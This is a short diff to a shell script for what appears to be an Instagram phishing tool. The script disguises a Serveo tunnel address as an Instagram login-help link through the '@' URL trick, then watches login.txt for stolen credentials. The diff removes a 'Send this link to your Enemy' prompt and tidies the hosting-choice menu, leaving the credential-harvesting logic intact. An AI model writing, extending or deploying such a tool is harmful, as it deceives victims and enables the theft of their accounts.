@@ -91,7 +91,6 @@ if [ ! -z "$SERVEO_URL" ]; then
   MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}"
   # echo -e "${GRN}[+] Serveo URL: $SERVEO_URL${NC}"  # Commented to hide raw URL
   echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
-  echo -e "${GRN}[#] Send this link to your Enemy ${NC}"
   echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
   tail -n 0 -f login.txt
 else
@@ -105,13 +104,8 @@ echo "2) Serveo.net (public)"
 read -p $'\n>> ' choice
 
 case $choice in
-  1)
-    start_localhost
-    ;;
-  2)
-    start_serveo
-    ;;
-  
+  1) start_localhost;;
+  2)start_serveo;;
   *)
     echo -e "${RED}[!] Invalid choice.${NC}"
     exit 1
